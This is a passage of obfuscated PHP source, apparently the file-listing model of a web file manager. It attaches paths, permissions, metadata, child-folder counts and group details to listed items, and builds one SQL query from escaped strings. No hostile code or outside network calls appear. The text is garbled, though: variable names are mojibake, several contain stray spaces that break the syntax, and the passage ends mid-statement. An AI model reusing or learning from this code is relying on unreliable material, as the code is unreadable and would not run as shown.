array_keys($e„äÈßÙ²Ô))) { $CÚ« ‘ø£ = $fº¾­›ÀŠ[418]; } goto BÇÚµ•–¡Û; c¡Ê×ÑâÄ‡: } protected function _listDataApplyItem($B¢á¶èŠ, $dÒßˆ†›Âì = false) { $B¦ÈÒÄ£° = array($B¢á¶èŠ); $this->_listDataApply($B¦ÈÒÄ£°, $dÒßˆ†›Âì); return $B¦ÈÒÄ£°[0]; } protected function _listDataApply(&$dÃÏ¦‰è¹, $d‡ë·Â‰Ğ = false) { goto DŠßºƒ¦ÑÜ; C¶‚‰œëøÖ: $this->_listAppendPath($dÃÏ¦‰è¹); $this->_listAppendAuth($dÃÏ¦‰è¹); $this->_listAppendSourceInfo($dÃÏ¦‰è¹, $FªÖ´›Öø); goto aùÆíªôÀä; aùÆíªôÀä: $this->_listAppendUser($dÃÏ¦‰è¹); $this->_listFilterInfo($dÃÏ¦‰è¹, $d‡ë·Â‰Ğ); goto B›¼Çƒƒ…ñ; B²×ôáñ¼: $FªÖ´›Öø = array_unique($FªÖ´›Öø); $this->_listSourceCache($dÃÏ¦‰è¹); if (!$d‡ë·Â‰Ğ) { $this->_listAppendMeta($dÃÏ¦‰è¹, $FªÖ´›Öø); $this->_listAppendFileMeta($dÃÏ¦‰è¹, $FªÖ´›Öø); $this->_listAppendChildren($dÃÏ¦‰è¹, $FªÖ´›Öø); } goto C¶‚‰œëøÖ; DŠßºƒ¦ÑÜ: $EÌá°™ï»î =& $_SERVER[úÎü]; if (!$dÃÏ¦‰è¹) { $dÃÏ¦‰è¹ = array(); return; } $FªÖ´›Öø = array_to_keyvalue($dÃÏ¦‰è¹, $EÌá°™ï»î[33], $EÌá°™ï»î[385]); goto B²×ôáñ¼; B›¼Çƒƒ…ñ: } protected function _listSourceCache($Cğ˜ŞŒŸÄÏ) { $Aµù®ŒÉ«ï =& $_SERVER[úÎü]; foreach ($Cğ˜ŞŒŸÄÏ as $D‹ŞªîƒĞ) { self::$cacheSourceInfo[$Aµù®ŒÉ«ï[426] . $D‹ŞªîƒĞ[$Aµù®ŒÉ«ï[385]]] = $D‹ŞªîƒĞ; } } protected function _listFilterInfo(&$BŞ–¸ˆá, $D™øô‚×ï† = false) { $cò½Õ²ŒÕÃ =& $_SERVER[úÎü]; foreach ($BŞ–¸ˆá as &$Bñ¥ŸäóÀì) { $Bñ¥ŸäóÀì = $this->pathInfoFilter($Bñ¥ŸäóÀì); self::$cachePathInfo[$cò½Õ²ŒÕÃ[427] . intval($D™øô‚×ï†) . $cò½Õ²ŒÕÃ[428] . $Bñ¥ŸäóÀì[$cò½Õ²ŒÕÃ[385]]] = $Bñ¥ŸäóÀì; } unset($Bñ¥ŸäóÀì); } protected function _listMake(&$F×Šºï±ä°) { $bÆ×¯ÇâÈ¡ =& $_SERVER[úÎü]; $F×Šºï±ä°[$bÆ×¯ÇâÈ¡[74]] = array(); $F×Šºï±ä°[$bÆ×¯ÇâÈ¡[73]] = array(); foreach ($F×Šºï±ä°[$bÆ×¯ÇâÈ¡[361]] as $C‹ÏÃ‹¥´) { $EÁøê×Ô— = $C‹ÏÃ‹¥´[$bÆ×¯ÇâÈ¡[386]] == 1 ? $bÆ×¯ÇâÈ¡[74] : $bÆ×¯ÇâÈ¡[73]; $F×Šºï±ä°[$EÁøê×Ô—][] = $C‹ÏÃ‹¥´; } unset($F×Šºï±ä°[$bÆ×¯ÇâÈ¡[361]]); } protected function _listAppendMeta(&$D¨Ííºõˆ¼, $C˜¢‹šëø¦) { goto cÃ«Å­¢¸ç; cÃ«Å­¢¸ç: $a³‰‚›˜‚’ =& $_SERVER[úÎü]; $B×Ê‘Ã‚·Ì = array($a³‰‚›˜‚’[399] => array($a³‰‚›˜‚’[400], $C˜¢‹šëø¦)); $C£®“Ø¡­ = Model($a³‰‚›˜‚’[429])->field($a³‰‚›˜‚’[430])->where($B×Ê‘Ã‚·Ì)->select(); goto cºå‘ŒÏÈ; fÇÈà…ñ»¯: foreach ($C£®“Ø¡­ as $BŞÚ÷´“½) { if (!isset($B–è‰‡ĞÍÕ[$BŞÚ÷´“½[$a³‰‚›˜‚’[385]]])) { $B–è‰‡ĞÍÕ[$BŞÚ÷´“½[$a³‰‚›˜‚’[385]]] = array(); } if (in_array($BŞÚ÷´“½[$a³‰‚›˜‚’[89]], $e‚ëˆâã„)) { continue; } $B–è‰‡ĞÍÕ[$BŞÚ÷´“½[$a³‰‚›˜‚’[385]]][$BŞÚ÷´“½[$a³‰‚›˜‚’[89]]] = $BŞÚ÷´“½[$a³‰‚›˜‚’[366]]; } foreach ($D¨Ííºõˆ¼ as &$C»—¡Ö‚ï‚) { $C»—¡Ö‚ï‚[$a³‰‚›˜‚’[433]] = !1; if (isset($B–è‰‡ĞÍÕ[$C»—¡Ö‚ï‚[$a³‰‚›˜‚’[385]]])) { $C»—¡Ö‚ï‚[$a³‰‚›˜‚’[433]] = $B–è‰‡ĞÍÕ[$C»—¡Ö‚ï‚[$a³‰‚›˜‚’[385]]]; } if ($this->fileIsLock($C»—¡Ö‚ï‚) && $C»—¡Ö‚ï‚[$a³‰‚›˜‚’[392]]) { $f®Æ‹ª³‰ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $C»—¡Ö‚ï‚[$a³‰‚›˜‚’[392]][$a³‰‚›˜‚’[393]] = AuthModel::authDisable($C»—¡Ö‚ï‚[$a³‰‚›˜‚’[392]][$a³‰‚›˜‚’[393]], $f®Æ‹ª³‰); $C»—¡Ö‚ï‚[$a³‰‚›˜‚’[392]][$a³‰‚›˜‚’[434]][$a³‰‚›˜‚’[392]] = $C»—¡Ö‚ï‚[$a³‰‚›˜‚’[392]][$a³‰‚›˜‚’[393]]; } } unset($C»—¡Ö‚ï‚); goto bŠ¨ø¦ö«Á; cºå‘ŒÏÈ: if (!$C£®“Ø¡­) { return; } $e‚ëˆâã„ = array($a³‰‚›˜‚’[431], $a³‰‚›˜‚’[432]); $B–è‰‡ĞÍÕ = array(); goto fÇÈà…ñ»¯; bŠ¨ø¦ö«Á: } protected function _listAppendFileMeta(&$bÒéîí¦œ, $FÑÒ“é­É´) { goto d¿¨ÎˆŞ¦–; b‘ƒ§ÈËÔ‡: $F­‡¶§ÏøÔ = $F­‡¶§ÏøÔ ? $F­‡¶§ÏøÔ : array(); $b«Í‚Ïöö = array(); foreach ($F­‡¶§ÏøÔ as $BŒô©–•†á) { if (!isset($b«Í‚Ïöö[$BŒô©–•†á[$BÇÖ¼·õãŠ[435]]])) { $b«Í‚Ïöö[$BŒô©–•†á[$BÇÖ¼·õãŠ[435]]] = array(); } $b«Í‚Ïöö[$BŒô©–•†á[$BÇÖ¼·õãŠ[435]]][$BŒô©–•†á[$BÇÖ¼·õãŠ[89]]] = $BŒô©–•†á[$BÇÖ¼·õãŠ[366]]; } goto cÎ¬£¶ŞìŞ; d¿¨ÎˆŞ¦–: $BÇÖ¼·õãŠ =& $_SERVER[úÎü]; $DÄÌÕØèÀ = array_to_keyvalue($bÒéîí¦œ, $BÇÖ¼·õãŠ[33], $BÇÖ¼·õãŠ[435]); $DÄÌÕØèÀ = array_filter(array_unique($DÄÌÕØèÀ)); goto c¢¼öˆœí’; cÎ¬£¶ŞìŞ: foreach ($bÒéîí¦œ as &$eÈˆ§”ñ‹İ) { goto c¤îê©Ì±ò; c¤îê©Ì±ò: $däƒ‘Áîİ· = $eÈˆ§”ñ‹İ[$BÇÖ¼·õãŠ[435]]; if (!$däƒ‘Áîİ· || !isset($a«Î»¡»ËÆ[$däƒ‘Áîİ·])) { continue; } $Cš‡òÉ‰Öç = $a«Î»¡»ËÆ[$däƒ‘Áîİ·]; goto c¦…¾ƒŒ·®; Eº”¾‰®Œß: if (isset($eÈˆ§”ñ‹İ[$BÇÖ¼·õãŠ[161]][$BÇÖ¼·õãŠ[160]])) { $eÈˆ§”ñ‹İ[$BÇÖ¼·õãŠ[160]] = json_decode($eÈˆ§”ñ‹İ[$BÇÖ¼·õãŠ[161]][$BÇÖ¼·õãŠ[160]], !0); unset($eÈˆ§”ñ‹İ[$BÇÖ¼·õãŠ[161]][$BÇÖ¼·õãŠ[160]]); } goto b®÷×çÎéä; c¦…¾ƒŒ·®: $Cš‡òÉ‰Öç[$BÇÖ¼·õãŠ[77]] = $eÈˆ§”ñ‹İ[$BÇÖ¼·õãŠ[77]]; $Cš‡òÉ‰Öç[$BÇÖ¼·õãŠ[28]] = $eÈˆ§”ñ‹İ[$BÇÖ¼·õãŠ[28]]; if (!isset(self::$cacheFileInfo[$BÇÖ¼·õãŠ[441] . $däƒ‘Áîİ·])) { self::$cacheFileInfo[$BÇÖ¼·õãŠ[441] . $däƒ‘Áîİ·] = array_merge(array(), $Cš‡òÉ‰Öç); } goto E¬Ôˆ‚µù; E¬Ôˆ‚µù: unset($a«Î»¡»ËÆ[$däƒ‘Áîİ·][$BÇÖ¼·õãŠ[75]]); $b÷„Šîù£Ğ = is_array($b«Í‚Ïöö[$däƒ‘Áîİ·]) ? $b«Í‚Ïöö[$däƒ‘Áîİ·] : array(); $eÈˆ§”ñ‹İ[$BÇÖ¼·õãŠ[161]] = array_merge($b÷„Šîù£Ğ, $a«Î»¡»ËÆ[$däƒ‘Áîİ·]); goto Eº”¾‰®Œß; b®÷×çÎéä: } unset($eÈˆ§”ñ‹İ); goto f—ÄÉÑ«Ç; Fš¶ì‹¥®: $a«Î»¡»ËÆ = Model($BÇÖ¼·õãŠ[438])->field($dâ‚ ªÔğ£)->where($f‘º¤­ñá)->select(); $a«Î»¡»ËÆ = array_to_keyvalue($a«Î»¡»ËÆ, $BÇÖ¼·õãŠ[435]); $F­‡¶§ÏøÔ = Model($BÇÖ¼·õãŠ[439])->field($BÇÖ¼·õãŠ[440])->where($f‘º¤­ñá)->select(); goto b‘ƒ§ÈËÔ‡; c¢¼öˆœí’: if (!$DÄÌÕØèÀ) { return; } $f‘º¤­ñá = array($BÇÖ¼·õãŠ[436] => array($BÇÖ¼·õãŠ[400], $DÄÌÕØèÀ)); $dâ‚ ªÔğ£ = $BÇÖ¼·õãŠ[437]; goto Fš¶ì‹¥®; f—ÄÉÑ«Ç: } protected function _listAppendSourceInfo(&$dÎíµ•Ùß, $aÊ¢‡œŒƒõ) { goto EÕ ¯ÅÇÏ÷; EÕ ¯ÅÇÏ÷: $Aæ¬Òì¸í  =& $_SERVER[úÎü]; if (!defined($Aæ¬Òì¸í [442])) { return; } $f¥©§…—‹ = Model($Aæ¬Òì¸í [443])->listData(); goto Cø©™ÏŸ‹Ü; D¨Ÿ«±öÁ: $E¶Ò…«¯ò = array_to_keyvalue($f¥©§…—‹, $Aæ¬Òì¸í [383]); $F‘à¢ĞÓĞæ = array_to_keyvalue_group($B§¯ŸªĞçÛ, $Aæ¬Òì¸í [75], $Aæ¬Òì¸í [409]); $aÕæ¬÷°¶ˆ = array_to_keyvalue($E•˜šÆ…‡í, $Aæ¬Òì¸í [75]); goto c¨Æ†Ì§ä; Cø©™ÏŸ‹Ü: $B§¯ŸªĞçÛ = Model($Aæ¬Òì¸í [408])->listData(); $E•˜šÆ…‡í = Model($Aæ¬Òì¸í [397])->listData(); $EİØ˜á£Ã‚ = Model($Aæ¬Òì¸í [444])->listSimple(); goto D¨Ÿ«±öÁ; c¨Æ†Ì§ä: $aêŒì•Ğ‰— = array_to_keyvalue_group($EİØ˜á£Ã‚, $Aæ¬Òì¸í [385]); foreach ($dÎíµ•Ùß as &$aªŸ’‡‰Ÿ) { $aªŸ’‡‰Ÿ[$Aæ¬Òì¸í [407]] = array($Aæ¬Òì¸í [445] => 0, $Aæ¬Òì¸í [446] => 0, $Aæ¬Òì¸í [447] => 0); if (isset($aÕæ¬÷°¶ˆ[$aªŸ’‡‰Ÿ[$Aæ¬Òì¸í [385]]])) { $aªŸ’‡‰Ÿ[$Aæ¬Òì¸í [407]][$Aæ¬Òì¸í [448]] = 1; $aªŸ’‡‰Ÿ[$Aæ¬Òì¸í [407]][$Aæ¬Òì¸í [449]] = $aÕæ¬÷°¶ˆ[$aªŸ’‡‰Ÿ[$Aæ¬Òì¸í [385]]][$Aæ¬Òì¸í [28]]; } if (isset($F‘à¢ĞÓĞæ[$aªŸ’‡‰Ÿ[$Aæ¬Òì¸í [385]]])) { $aªŸ’‡‰Ÿ[$Aæ¬Òì¸í [407]][$Aæ¬Òì¸í [450]] = array(); foreach ($F‘à¢ĞÓĞæ[$aªŸ’‡‰Ÿ[$Aæ¬Òì¸í [385]]] as $FÄŒø£Œ¯«) { $bƒåÎ“±¼ù = $E¶Ò…«¯ò[$FÄŒø£Œ¯«]; $aªŸ’‡‰Ÿ[$Aæ¬Òì¸í [407]][$Aæ¬Òì¸í [450]][] = array($Aæ¬Òì¸í [451] => $bƒåÎ“±¼ù[$Aæ¬Òì¸í [383]], $Aæ¬Òì¸í [402] => $bƒåÎ“±¼ù[$Aæ¬Òì¸í [28]], $Aæ¬Òì¸í [452] => $bƒåÎ“±¼ù[$Aæ¬Òì¸í [453]]); } } if (isset($aêŒì•Ğ‰—[$aªŸ’‡‰Ÿ[$Aæ¬Òì¸í [385]]])) { $aªŸ’‡‰Ÿ[$Aæ¬Òì¸í [407]][$Aæ¬Òì¸í [454]] = array(); foreach ($aêŒì•Ğ‰—[$aªŸ’‡‰Ÿ[$Aæ¬Òì¸í [385]]] as $dí¼ÁÊ÷±) { $aªŸ’‡‰Ÿ[$Aæ¬Òì¸í [407]][$Aæ¬Òì¸í [454]] = array($Aæ¬Òì¸í [455] => $dí¼ÁÊ÷±[$Aæ¬Òì¸í [456]], $Aæ¬Òì¸í [457] => $dí¼ÁÊ÷±[$Aæ¬Òì¸í [458]], $Aæ¬Òì¸í [459] => $dí¼ÁÊ÷±[$Aæ¬Òì¸í [385]], $Aæ¬Òì¸í [460] => $dí¼ÁÊ÷±[$Aæ¬Òì¸í [461]], $Aæ¬Òì¸í [462] => $dí¼ÁÊ÷±[$Aæ¬Òì¸í [463]], $Aæ¬Òì¸í [464] => $dí¼ÁÊ÷±[$Aæ¬Òì¸í [464]], $Aæ¬Òì¸í [465] => $dí¼ÁÊ÷±[$Aæ¬Òì¸í [465]]); } } } unset($aªŸ’‡‰Ÿ); goto bæì÷çÙÆÆ; bæì÷çÙÆÆ: return $dÎíµ•Ùß; goto aÙŸŠù¼ìÃ; aÙŸŠù¼ìÃ: } protected function _listAppendChildren(&$c¶Û’ë¨öÅ, $D¬¨ĞµØóî) { goto F×éÃã„Ã…; F×éÃã„Ã…: $f±íšÔ·Öâ =& $_SERVER[úÎü]; $b•âŸŒ†õ = $f±íšÔ·Öâ[368]; $d™ö¥¼‡—• = array(); goto C÷¤®ï‹Ü; C÷¤®ï‹Ü: $b¦Üª¸”‹º = 1024 * 50; $c¶Û’ë¨öÅ = is_array($c¶Û’ë¨öÅ) ? $c¶Û’ë¨öÅ : array(); $C‚¨êìÌ©ã = count($c¶Û’ë¨öÅ); goto DÍ¬¥¶àÑÅ; AƒªÛğëç: foreach ($c¶Û’ë¨öÅ as &$D‰¶çÃÆ·æ) { if ($D‰¶çÃÆ·æ[$f±íšÔ·Öâ[386]]) { unset($D‰¶çÃÆ·æ[$f±íšÔ·Öâ[388]]); $D‰¶çÃÆ·æ[$f±íšÔ·Öâ[200]] = intval($d™ö¥¼‡—•[$D‰¶çÃÆ·æ[$f±íšÔ·Öâ[385]] . $f±íšÔ·Öâ[468]][$f±íšÔ·Öâ[469]]); $D‰¶çÃÆ·æ[$f±íšÔ·Öâ[199]] = intval($d™ö¥¼‡—•[$D‰¶çÃÆ·æ[$f±íšÔ·Öâ[385]] . $f±íšÔ·Öâ[470]][$f±íšÔ·Öâ[469]]); } } unset($D‰¶çÃÆ·æ); goto cˆª ø›¸À; DÍ¬¥¶àÑÅ: $cŸèÒî¼ˆ = $this->tablePrefix . $this->tableName; for ($bé¢ÑÓŸÛ‰ = 0; $bé¢ÑÓŸÛ‰ < $C‚¨êìÌ©ã; $bé¢ÑÓŸÛ‰++) { $dÅÇÔ®° ± = intval($c¶Û’ë¨öÅ[$bé¢ÑÓŸÛ‰][$f±íšÔ·Öâ[413]]); if ($c¶Û’ë¨öÅ[$bé¢ÑÓŸÛ‰][$f±íšÔ·Öâ[386]]) { $Eì½çöåØ = $c¶Û’ë¨öÅ[$bé¢ÑÓŸÛ‰][$f±íšÔ·Öâ[385]]; $b•âŸŒ†õ .= "\x53\105\114\105\103\124\40\52\x20\x46\122\x4f\x4d\40\x28\x53\105\114\x45\103\124\40\x27{$Eì½çöåØ}\x5f\150\x61\163\106\151\x6c\x65\x27\x20\141\163\x20\150\141\x73\x2c\x63\157\165\156\x74\x28\61\x29\40\x61\x73\40\x68\141\x73\x43\157\165\156\164\x20\x46\x52\117\115\40\140{$cŸèÒî¼ˆ}\x60\x20\xa\11\11\11\11\11\x77\150\145\162\x65\40\160\141\x72\x65\156\164\x49\x44\75{$Eì½çöåØ}\x20\141\156\x64\x20\151\x73\x46\x6f\x6c\x64\145\x72\x3d\60\x20\x61\x6e\x64\40\151\163\x44\145\154\145\x74\x65\x3d{$dÅÇÔ®° ±}\x29\x20\141\163\40\164\142\61\137{$Eì½çöåØ}\40\165\156\x69\x6f\156\40\141\154\x6c\x20\xa\11\11\x9\11\11\x53\105\114\x45\x43\124\40\52\40\106\122\117\115\x20\50\x53\x45\x4c\105\x43\124\x20\x27{$Eì½çöåØ}\137\150\x61\x73\106\x6f\x6c\144\145\162\47\40\141\x73\40\x68\141\163\x46\151\154\145\54\x63\x6f\165\x6e\x74\x28\61\51\x20\x61\163\x20\x68\141\x73\x43\157\165\156\x74\40\x46\x52\117\x4d\40\x60{$cŸèÒî¼ˆ}\140\x20\12\x9\11\x9\11\11\167\x68\x65\162\x65\x20\x70\141\x72\145\156\x74\111\104\75{$Eì½çöåØ}\x20\x61\156\x64\40\151\163\106\157\154\x64\x65\x72\x3d\61\x20\x61\x6e\144\x20\x69\163\x44\x65\154\x65\164\145\x3d{$dÅÇÔ®° ±}\x29\40\x61\163\40\164\x62\x32\x5f{$Eì½çöåØ}\40\x75\156\x69\x6f\156\40\141\x6c\154\x20"; } if ((strlen($b•âŸŒ†õ) >= $b¦Üª¸”‹º || $bé¢ÑÓŸÛ‰ == $C‚¨êìÌ©ã - 1) && $b•âŸŒ†õ) { $b•âŸŒ†õ = substr($b•âŸŒ†õ, 0, -strlen($f±íšÔ·Öâ[466])); $D›å¶…‚”§ = $this->query($b•âŸŒ†õ); $d™ö¥¼‡—• = array_merge($d™ö¥¼‡—•, $D›å¶…‚”§); $b•âŸŒ†õ = $f±íšÔ·Öâ[33]; } } $d™ö¥¼‡—• = array_to_keyvalue($d™ö¥¼‡—•, $f±íšÔ·Öâ[467]); goto AƒªÛğëç; cˆª ø›¸À: } protected function _listAppendAuth(&$fî”ÕÌ¢Ó¸) { goto a£Ö•´‹ùÆ; a£Ö•´‹ùÆ: $FÈà¿ˆí•‚ =& $_SERVER[úÎü]; if (!defined($FÈà¿ˆí•‚[442])) { return; } $cÙ„Ñë®Ø‹ = array(); goto a‡íƒãŸ–ò; D´»‚‡‡§—: $E‰¹Æ´ä = Model($FÈà¿ˆí•‚[471])->getSourceList($cÙ„Ñë®Ø‹, $c—Ëˆµâ¥); foreach ($fî”ÕÌ¢Ó¸ as $EùœÀÊˆ¿ => &$aİÚ·—í†ô) { $aİÚ·—í†ô[$FÈà¿ˆí•‚[392]] = $E‰¹Æ´ä[$aİÚ·—í†ô[$FÈà¿ˆí•‚[385]]]; if (!$aİÚ·—í†ô[$FÈà¿ˆí•‚[392]] && $aİÚ·—í†ô[$FÈà¿ˆí•‚[387]] == self::TYPE_GROUP) { $aİÚ·—í†ô[$FÈà¿ˆí•‚[392]] = Action($FÈà¿ˆí•‚[472])->pathGroupAuthMake($aİÚ·—í†ô[$FÈà¿ˆí•‚[473]]); if (!$aİÚ·—í†ô[$FÈà¿ˆí•‚[392]] && !_get($GLOBALS, $FÈà¿ˆí•‚[474])) { $aİÚ·—í†ô[$FÈà¿ˆí•‚[192]] = !1; $aİÚ·—í†ô[$FÈà¿ˆí•‚[191]] = !1; } } if ($aİÚ·—í†ô[$FÈà¿ˆí•‚[392]]) { $aİÚ·—í†ô[$FÈà¿ˆí•‚[192]] = AuthModel::authCheckEdit($aİÚ·—í†ô[$FÈà¿ˆí•‚[392]][$FÈà¿ˆí•‚[393]]); $aİÚ·—í†ô[$FÈà¿ˆí•‚[191]] = AuthModel::authCheckView($aİÚ·—í†ô[$FÈà¿ˆí•‚[392]][$FÈà¿ˆí•‚[393]]); } $this->groupPathDisplay($aİÚ·—í†ô); } unset($aİÚ·—í†ô); goto d˜Êœ„ƒ×ø; a‡íƒãŸ–ò: foreach ($fî”ÕÌ¢Ó¸ as $aİÚ·—í†ô) { if ($aİÚ·—í†ô[$FÈà¿ˆí•‚[387]] == self::TYPE_GROUP) { $cÙ„Ñë®Ø‹[] = $aİÚ·—í†ô[$FÈà¿ˆí•‚[385]]; } } if (!$cÙ„Ñë®Ø‹) { return; } $c—Ëˆµâ¥ = array_to_keyvalue($fî”ÕÌ¢Ó¸, $FÈà¿ˆí•‚[385]); goto D´»‚‡‡§—; d˜Êœ„ƒ×ø: } public function groupPathDisplay(&$Cî¡öŒÁèœ) { goto e•òã´‘˜; e•òã´‘˜: $få×ÂÅî´ =& $_SERVER[úÎü]; if ($Cî¡öŒÁèœ[$få×ÂÅî´[387]] != self::TYPE_GROUP) { return; } $c§Şèâ¾’¿ = Model($få×ÂÅî´[475])->getInfo($Cî¡öŒÁèœ[$få×ÂÅî´[473]]); goto dîŸÊÈ½˜Ï; Fç”¦ÎÖõ: $Cî¡öŒÁèœ[$få×ÂÅî´[477]] = $c§Şèâ¾’¿[$få×ÂÅî´[478]]; $Cî¡öŒÁèœ[$få×ÂÅî´[396]] = $c§Şèâ¾’¿[$få×ÂÅî´[476]]; $Cî¡öŒÁèœ[$få×ÂÅî´[479]] = $c§Şèâ¾’¿[$få×ÂÅî´[480]]; goto b˜¼ƒåçàÈ; b˜¼ƒåçàÈ: $Cî¡öŒÁèœ[$få×ÂÅî´[481]] = $C£æ§…ÚŠ¤ . $c§Şèâ¾’¿[$få×ÂÅî´[407]][$få×ÂÅî´[385]]; goto a²áµæ¸‰; dîŸÊÈ½˜Ï: $e£Äö¡¦‚ˆ = $this->parentLevelArray($c§Şèâ¾’¿[$få×ÂÅî´[476]]); $C£æ§…ÚŠ¤ = $få×ÂÅî´[33]; foreach ($e£Äö¡¦‚ˆ as $Eàô—ã¤ç©) { $C…İĞ¿¦†› = Model($få×ÂÅî´[475])->getInfo($Eàô—ã¤ç©); $C£æ§…ÚŠ¤ .= $C…İĞ¿¦†›[$få×ÂÅî´[407]][$få×ÂÅî´[385]] . $få×ÂÅî´[47]; } goto Fç”¦ÎÖõ; a²áµæ¸‰: } protected function _listAppendPath(&$E¥¤è÷²) { goto f¼‰äÅ¸„ˆ; cĞÏ’Ï”ñØ: return $E¥¤è÷²; goto C¬ßÑ³Æİ; b„‡½‘×­Î: $eÄÒ‡¾äÅ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($E¥¤è÷² as &$C¡âº•µ) { goto D´”ººŒ‡Õ; E¬ˆÓË¢á: if ($C”ÛŸ´¬) { $aÁ½ñù†İ .= $C¡âº•µ[$BãåÆÄ÷Åó[28]]; } if ($C¡âº•µ[$BãåÆÄ÷Åó[386]]) { $aÁ½ñù†İ .= $BãåÆÄ÷Åó[8]; } $C¡âº•µ[$BãåÆÄ÷Åó[483]] = str_replace($BãåÆÄ÷Åó[484], $BãåÆÄ÷Åó[8], $aÁ½ñù†İ); goto F²í«°¾Ä; D´”ººŒ‡Õ: $C”ÛŸ´¬ = $this->parentLevelArray($C¡âº•µ[$BãåÆÄ÷Åó[476]]); $aÁ½ñù†İ = $this->_listAppendPathRoot($C¡âº•µ, $C”ÛŸ´¬); foreach ($C”ÛŸ´¬ as $C²ÈŞÚåÄ => $B÷›È¦Õ’¼) { if ($C²ÈŞÚåÄ == 0 && $aÁ½ñù†İ && $C¡âº•µ[$BãåÆÄ÷Åó[387]] == self::TYPE_GROUP) { continue; } if (isset($bÔ„§íøëæ[$B÷›È¦Õ’¼])) { $aÁ½ñù†İ .= $bÔ„§íøëæ[$B÷›È¦Õ’¼] . $BãåÆÄ÷Åó[8]; } } goto E¬ˆÓË¢á; F²í«°¾Ä: $FÊßŒè‰±Ş = trim($C¡âº•µ[$BãåÆÄ÷Åó[483]], $BãåÆÄ÷Åó[8]); if ($C¡âº•µ[$BãåÆÄ÷Åó[478]] == $BãåÆÄ÷Åó[485] && $FÊßŒè‰±Ş) { $C¡âº•µ[$BãåÆÄ÷Åó[28]] = $FÊßŒè‰±Ş; } $this->_listAppendPathRecycle($C¡âº•µ, $C”ÛŸ´¬, $eÄÒ‡¾äÅ); goto cĞ—³‘‰Ñ½; cĞ—³‘‰Ñ½: } unset($C¡âº•µ); goto cĞÏ’Ï”ñØ; f¼‰äÅ¸„ˆ: $BãåÆÄ÷Åó =& $_SERVER[úÎü]; static $bÔ„§íøëæ = array(); $eø®Íˆì»í = array(); goto DÔŠ§‹Í§; DÔŠ§‹Í§: foreach ($E¥¤è÷² as &$C¡âº•µ) { $bÔ„§íøëæ[$C¡âº•µ[$BãåÆÄ÷Åó[385]]] = $C¡âº•µ[$BãåÆÄ÷Åó[28]]; $C”ÛŸ´¬ = $this->parentLevelArray($C¡âº•µ[$BãåÆÄ÷Åó[476]]); foreach ($C”ÛŸ´¬ as $C²ÈŞÚåÄ => $B÷›È¦Õ’¼) { if ($C²ÈŞÚåÄ != 0 && !isset($bÔ„§íøëæ[$B÷›È¦Õ’¼])) { $eø®Íˆì»í[] = $B÷›È¦Õ’¼; } } } unset($C¡âº•µ); if (count($eø®Íˆì»í) > 0) { $B¯İ…ˆïË = array($BãåÆÄ÷Åó[399] => array($BãåÆÄ÷Åó[400], $eø®Íˆì»í)); if (count($eø®Íˆì»í) == 1) { $CÇ´ÊÓàÃ = $this->sourceInfo($eø®Íˆì»í[0]); $DÆ‘Ë‘¸¢ = is_array($CÇ´ÊÓàÃ) ? array($CÇ´ÊÓàÃ) : !1; } else { $DÆ‘Ë‘¸¢ = $this->field($BãåÆÄ÷Åó[482])->where($B¯İ…ˆïË)->select(); } $d“‰£Í¬ó¬ = array_to_keyvalue($DÆ‘Ë‘¸¢, $BãåÆÄ÷Åó[385], $BãåÆÄ÷Åó[28]); $bÔ„§íøëæ = array_merge_index($bÔ„§íøëæ, $d“‰£Í¬ó¬); } goto b„‡½‘×­Î; C¬ßÑ³Æİ: } private function _listAppendPathRecycle(&$e¼â¢™Å…£, $FÂ£ïë‘, $Açø°Õ„Çê) { goto dÂòÂ«İÉ—; dÂòÂ«İÉ—: $f’Õí®ö¢ =& $_SERVER[úÎü]; if (intval($e¼â¢™Å…£[$f’Õí®ö¢[387]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($Açø°Õ„Çê, $FÂ£ïë‘) && $e¼â¢™Å…£[$f’Õí®ö¢[385]] != $Açø°Õ„Çê) { return; } goto föÂóœ°œ¯; c‘´‹¸‰ƒÀ: $e¼â¢™Å…£[$f’Õí®ö¢[476]] = $f’Õí®ö¢[487] . implode($f’Õí®ö¢[47], array_slice($FÂ£ïë‘, 1)) . $f’Õí®ö¢[47]; if ($e¼â¢™Å…£[$f’Õí®ö¢[385]] == $Açø°Õ„Çê) { $e¼â¢™Å…£[$f’Õí®ö¢[476]] = $f’Õí®ö¢[487]; $e¼â¢™Å…£[$f’Õí®ö¢[478]] = $f’Õí®ö¢[485]; $e¼â¢™Å…£[$f’Õí®ö¢[28]] = LNG($f’Õí®ö¢[486]); } $e¼â¢™Å…£[$f’Õí®ö¢[488]] = $f’Õí®ö¢[489]; goto A÷±Ô÷¯š®; föÂóœ°œ¯: $EÁå‚ˆ®¯« = explode($f’Õí®ö¢[8], trim($e¼â¢™Å…£[$f’Õí®ö¢[483]], $f’Õí®ö¢[8])); $dÇŸ–“ÙíÎ = implode($f’Õí®ö¢[8], array_slice($EÁå‚ˆ®¯«, 2)); $e¼â¢™Å…£[$f’Õí®ö¢[483]] = $f’Õí®ö¢[8] . LNG($f’Õí®ö¢[486]) . $f’Õí®ö¢[8] . ltrim($dÇŸ–“ÙíÎ, $f’Õí®ö¢[8]); goto c‘´‹¸‰ƒÀ; A÷±Ô÷¯š®: } protected function _listAppendPathRoot(&$aÑ¸ Ë°‚é, $F…‰›š‘â) { $EÑ†Ò…¨†¿ =& $_SERVER[úÎü]; $D¹ğˆª÷öß = $EÑ†Ò…¨†¿[33]; if ($aÑ¸ Ë°‚é[$EÑ†Ò…¨†¿[387]] == self::TYPE_USER) { if (defined($EÑ†Ò…¨†¿[442]) && $aÑ¸ Ë°‚é[$EÑ†Ò…¨†¿[473]] == USER_ID) { $D¹ğˆª÷öß = LNG($EÑ†Ò…¨†¿[490]); if (!$F…‰›š‘â) { $aÑ¸ Ë°‚é[$EÑ†Ò…¨†¿[28]] = $D¹ğˆª÷öß; } } else { $EôË¢œáÑ = Model($EÑ†Ò…¨†¿[491])->getInfoSimple($aÑ¸ Ë°‚é[$EÑ†Ò…¨†¿[473]]); $D¹ğˆª÷öß = LNG($EÑ†Ò…¨†¿[492]) . $EÑ†Ò…¨†¿[157] . $EôË¢œáÑ[$EÑ†Ò…¨†¿[28]] . $EÑ†Ò…¨†¿[493]; } } else { if ($aÑ¸ Ë°‚é[$EÑ†Ò…¨†¿[387]] == self::TYPE_GROUP) { $EôË¢œáÑ = Model($EÑ†Ò…¨†¿[475])->getInfoSimple($aÑ¸ Ë°‚é[$EÑ†Ò…¨†¿[473]]); $D¹ğˆª÷öß = 